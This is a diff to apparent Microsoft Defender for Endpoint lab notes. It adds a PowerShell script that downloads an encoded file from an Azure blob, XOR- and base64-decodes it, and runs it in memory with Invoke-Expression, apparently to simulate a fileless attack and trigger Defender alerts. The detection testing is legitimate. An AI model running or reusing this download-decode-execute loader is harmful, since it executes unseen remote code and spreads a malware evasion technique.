@@ -44,6 +44,50 @@ Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
  
 ```
 
+
+### This script now includes a check to see if the directory C:\Temp exists, and if it doesn't, it creates the directory before downloading the file.
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+
+# Define the URL and the destination path
+$url = "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt"
+$destination = "C:\Temp\MTP_Fileless_Recon.txt"
+$destinationDir = [System.IO.Path]::GetDirectoryName($destination)
+
+# Create the directory if it doesn't exist
+If (-Not (Test-Path -Path $destinationDir)) {
+    New-Item -ItemType Directory -Path $destinationDir
+}
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection')
+
+$base64String = Get-Content -Path "C:\Temp\MTP_Fileless_Recon.txt"
+
+Try {
+    $contentBytes = [System.Convert]::FromBase64String($base64String)
+} Catch {
+    $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3))
+}
+
+$i = 0
+
+$decryptedBytes = @()
+
+$contentBytes.ForEach{
+    $decryptedBytes += $_ -bxor $xor[$i]
+    $i++
+    if ($i -eq $xor.Length) {
+        $i = 0
+    }
+}
+
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+```
+
+
 Alerts <br>
 <img width="2130" alt="image" src="https://github.com/guguji666666/GJS-MDE/assets/96930989/8acbaa10-d61b-4e1a-9f1e-d4163a6deb33">
 
